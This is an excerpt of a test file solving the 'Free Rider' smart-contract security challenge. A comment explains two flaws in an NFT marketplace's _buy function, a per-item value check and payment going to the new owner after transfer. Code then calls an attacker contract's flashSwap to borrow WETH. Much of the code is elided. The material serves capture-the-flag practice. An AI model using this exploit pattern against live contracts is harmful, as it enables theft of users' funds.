...
describe("[Challenge] Free Rider", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * The main idea here is make a flashSwap to get some eth and use them to buy the nfts
     * The NFTMarketplace has 2 exploits in the _buy function:
     * 1. You can buy all nft sending the value of one nfts
     * 2. You will receive your money back after sending the value because first the function set
     * the owner of the nft and them transfer
     */

    const freeRiderAttacker = await (
    ...
    await freeRiderAttacker
      .connect(attacker)
      .flashSwap(this.weth.address, NFT_PRICE, {
        gasLimit: 1e6,
      });
  });
